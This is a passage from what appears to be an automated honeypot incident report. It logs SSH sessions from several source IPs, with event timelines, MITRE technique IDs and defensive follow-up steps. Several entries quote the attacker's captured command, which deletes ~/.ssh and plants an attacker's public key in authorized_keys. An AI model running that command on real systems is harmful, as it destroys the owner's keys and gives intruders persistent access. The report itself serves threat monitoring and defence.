| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 03:00:15` | `cowrie.session.connect` |
| `2026-04-12 03:00:15` | `cowrie.client.version` |
| `2026-04-12 03:00:15` | `cowrie.client.kex` |
| `2026-04-12 03:00:16` | `cowrie.login.success` |
| `2026-04-12 03:00:16` | `cowrie.session.params` |
| `2026-04-12 03:00:16` | `cowrie.command.input` |
| `2026-04-12 03:00:16` | `cowrie.command.failed` |
| `2026-04-12 03:00:17` | `cowrie.log.closed` |
| `2026-04-12 03:00:17` | `cowrie.session.params` |
| `2026-04-12 03:00:17` | `cowrie.command.input` |
| `2026-04-12 03:00:17` | `cowrie.session.file_download` |
| `2026-04-12 03:00:17` | `cowrie.log.closed` |
| `2026-04-12 03:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a558999196f1

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 03:00 |
| **Last Seen** | 2026-04-12 03:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 03:00:16` | `cowrie.session.connect` |
| `2026-04-12 03:00:16` | `cowrie.client.version` |
| `2026-04-12 03:00:16` | `cowrie.client.kex` |
| `2026-04-12 03:00:20` | `cowrie.login.success` |
| `2026-04-12 03:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d51ffbf098

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 03:00 |
| **Last Seen** | 2026-04-12 03:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 03:00:19` | `cowrie.session.connect` |
| `2026-04-12 03:00:19` | `cowrie.client.version` |
| `2026-04-12 03:00:20` | `cowrie.client.kex` |
| `2026-04-12 03:00:20` | `cowrie.login.success` |
| `2026-04-12 03:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f2cb5232d0a

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 03:02 |
| **Last Seen** | 2026-04-12 03:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 03:02:09` | `cowrie.session.connect` |
| `2026-04-12 03:02:09` | `cowrie.client.version` |
| `2026-04-12 03:02:09` | `cowrie.client.kex` |
| `2026-04-12 03:02:10` | `cowrie.login.success` |
| `2026-04-12 03:02:10` | `cowrie.session.params` |
| `2026-04-12 03:02:10` | `cowrie.command.input` |
| `2026-04-12 03:02:10` | `cowrie.command.failed` |
| `2026-04-12 03:02:10` | `cowrie.log.closed` |
| `2026-04-12 03:02:11` | `cowrie.session.params` |
| `2026-04-12 03:02:11` | `cowrie.command.input` |
| `2026-04-12 03:02:11` | `cowrie.session.file_download` |
| `2026-04-12 03:02:11` | `cowrie.log.closed` |
| `2026-04-12 03:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7dbe23697b3

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 03:02 |
| **Last Seen** | 2026-04-12 03:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 03:02:13` | `cowrie.session.connect` |
| `2026-04-12 03:02:13` | `cowrie.client.version` |
| `2026-04-12 03:02:14` | `cowrie.client.kex` |
| `2026-04-12 03:02:14` | `cowrie.login.success` |
| `2026-04-12 03:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7dba1ab35a9

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 03:07 |
| **Last Seen** | 2026-04-12 03:08 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 03:07:55` | `cowrie.session.connect` |
| `2026-04-12 03:07:56` | `cowrie.client.version` |
| `2026-04-12 03:07:56` | `cowrie.client.kex` |
| `2026-04-12 03:08:00` | `cowrie.login.success` |
| `2026-04-12 03:08:01` | `cowrie.session.params` |
| `2026-04-12 03:08:01` | `cowrie.command.input` |
| `2026-04-12 03:08:01` | `cowrie.command.failed` |
| `2026-04-12 03:08:02` | `cowrie.log.closed` |
| `2026-04-12 03:08:04` | `cowrie.session.params` |
| `2026-04-12 03:08:04` | `cowrie.command.input` |
| `2026-04-12 03:08:04` | `cowrie.session.file_download` |
| `2026-04-12 03:08:04` | `cowrie.log.closed` |
| `2026-04-12 03:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0199b9b8790f

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 03:08 |
| **Last Seen** | 2026-04-12 03:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 03:08:11` | `cowrie.session.connect` |
| `2026-04-12 03:08:11` | `cowrie.client.version` |
| `2026-04-12 03:08:11` | `cowrie.client.kex` |
| `2026-04-12 03:08:15` | `cowrie.login.success` |
| `2026-04-12 03:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74365fe4f267

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 03:15 |
| **Last Seen** | 2026-04-12 03:16 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 03:15:46` | `cowrie.session.connect` |
| `2026-04-12 03:15:46` | `cowrie.client.version` |
| `2026-04-12 03:15:46` | `cowrie.client.kex` |
| `2026-04-12 03:15:52` | `cowrie.login.success` |
| `2026-04-12 03:15:53` | `cowrie.session.params` |
| `2026-04-12 03:15:53` | `cowrie.command.input` |
| `2026-04-12 03:15:53` | `cowrie.command.failed` |
| `2026-04-12 03:15:53` | `cowrie.log.closed` |
| `2026-04-12 03:15:53` | `cowrie.session.params` |
| `2026-04-12 03:15:53` | `cowrie.command.input` |
| `2026-04-12 03:15:54` | `cowrie.session.file_download` |
| `2026-04-12 03:15:54` | `cowrie.log.closed` |
| `2026-04-12 03:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7e342ba0c5f

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 03:15 |
| **Last Seen** | 2026-04-12 03:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 03:15:59` | `cowrie.session.connect` |
| `2026-04-12 03:15:59` | `cowrie.client.version` |
| `2026-04-12 03:15:59` | `cowrie.client.kex` |
| `2026-04-12 03:16:02` | `cowrie.login.success` |
| `2026-04-12 03:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ebbbbaa718b

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 03:28 |
| **Last Seen** | 2026-04-12 03:28 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 03:28:15` | `cowrie.session.connect` |
| `2026-04-12 03:28:15` | `cowrie.client.version` |
| `2026-04-12 03:28:16` | `cowrie.client.kex` |
| `2026-04-12 03:28:18` | `cowrie.login.success` |
| `2026-04-12 03:28:20` | `cowrie.session.params` |
| `2026-04-12 03:28:20` | `cowrie.command.input` |
| `2026-04-12 03:28:20` | `cowrie.command.failed` |
| `2026-04-12 03:28:22` | `cowrie.log.closed` |
| `2026-04-12 03:28:23` | `cowrie.session.params` |
| `2026-04-12 03:28:23` | `cowrie.command.input` |
| `2026-04-12 03:28:23` | `cowrie.session.file_download` |
| `2026-04-12 03:28:23` | `cowrie.log.closed` |
| `2026-04-12 03:28:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a1fbc3c5c9f

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 03:28 |
| **Last Seen** | 2026-04-12 03:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 03:28:30` | `cowrie.session.connect` |
| `2026-04-12 03:28:31` | `cowrie.client.version` |
| `2026-04-12 03:28:32` | `cowrie.client.kex` |
| `2026-04-12 03:28:36` | `cowrie.login.success` |
| `2026-04-12 03:28:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2afb046f775

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:49 |
| **Last Seen** | 2026-04-12 05:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:49:41` | `cowrie.session.connect` |
| `2026-04-12 05:49:41` | `cowrie.client.version` |
| `2026-04-12 05:49:41` | `cowrie.client.kex` |
| `2026-04-12 05:49:42` | `cowrie.login.success` |
| `2026-04-12 05:49:42` | `cowrie.session.params` |
| `2026-04-12 05:49:42` | `cowrie.command.input` |
| `2026-04-12 05:49:42` | `cowrie.command.failed` |
| `2026-04-12 05:49:43` | `cowrie.log.closed` |
| `2026-04-12 05:49:43` | `cowrie.session.params` |
| `2026-04-12 05:49:43` | `cowrie.command.input` |
| `2026-04-12 05:49:43` | `cowrie.session.file_download` |
| `2026-04-12 05:49:43` | `cowrie.log.closed` |
| `2026-04-12 05:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83f57f1b776d

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:49 |
| **Last Seen** | 2026-04-12 05:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:49:46` | `cowrie.session.connect` |
| `2026-04-12 05:49:46` | `cowrie.client.version` |
| `2026-04-12 05:49:46` | `cowrie.client.kex` |
| `2026-04-12 05:49:47` | `cowrie.login.success` |
| `2026-04-12 05:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0449e727f27e

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-12 05:50 |
| **Last Seen** | 2026-04-12 05:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:50:52` | `cowrie.session.connect` |
| `2026-04-12 05:50:52` | `cowrie.client.version` |
| `2026-04-12 05:50:52` | `cowrie.client.kex` |
| `2026-04-12 05:50:52` | `cowrie.login.success` |
| `2026-04-12 05:50:53` | `cowrie.session.params` |
| `2026-04-12 05:50:53` | `cowrie.command.input` |
| `2026-04-12 05:50:53` | `cowrie.command.failed` |
| `2026-04-12 05:50:53` | `cowrie.log.closed` |
| `2026-04-12 05:50:53` | `cowrie.session.params` |
| `2026-04-12 05:50:53` | `cowrie.command.input` |
| `2026-04-12 05:50:53` | `cowrie.session.file_download` |
| `2026-04-12 05:50:53` | `cowrie.log.closed` |
| `2026-04-12 05:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b079b8c1e911

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-12 05:50 |
| **Last Seen** | 2026-04-12 05:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:50:55` | `cowrie.session.connect` |
| `2026-04-12 05:50:55` | `cowrie.client.version` |
| `2026-04-12 05:50:56` | `cowrie.client.kex` |
| `2026-04-12 05:50:56` | `cowrie.login.success` |
| `2026-04-12 05:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa65864863fa

| Field | Detail |
|---|---|
| **Source IP** | `102.140.97[.]134` |
| **First Seen** | 2026-04-12 05:51 |
| **Last Seen** | 2026-04-12 05:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:51:17` | `cowrie.session.connect` |
| `2026-04-12 05:51:17` | `cowrie.client.version` |
| `2026-04-12 05:51:17` | `cowrie.client.kex` |
| `2026-04-12 05:51:18` | `cowrie.login.success` |
| `2026-04-12 05:51:19` | `cowrie.session.params` |
| `2026-04-12 05:51:19` | `cowrie.command.input` |
| `2026-04-12 05:51:19` | `cowrie.command.failed` |
| `2026-04-12 05:51:19` | `cowrie.log.closed` |
| `2026-04-12 05:51:20` | `cowrie.session.params` |
| `2026-04-12 05:51:20` | `cowrie.command.input` |
| `2026-04-12 05:51:20` | `cowrie.session.file_download` |
| `2026-04-12 05:51:20` | `cowrie.log.closed` |
| `2026-04-12 05:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.140.97[.]134` to AbuseIPDB if not already reported
- [ ] Block `102.140.97[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e2e60240791

| Field | Detail |
|---|---|
| **Source IP** | `102.140.97[.]134` |
| **First Seen** | 2026-04-12 05:51 |
| **Last Seen** | 2026-04-12 05:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:51:24` | `cowrie.session.connect` |
| `2026-04-12 05:51:24` | `cowrie.client.version` |
| `2026-04-12 05:51:24` | `cowrie.client.kex` |
| `2026-04-12 05:51:25` | `cowrie.login.success` |
| `2026-04-12 05:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.140.97[.]134` to AbuseIPDB if not already reported
- [ ] Block `102.140.97[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-663f840dc916

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:51 |
| **Last Seen** | 2026-04-12 05:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
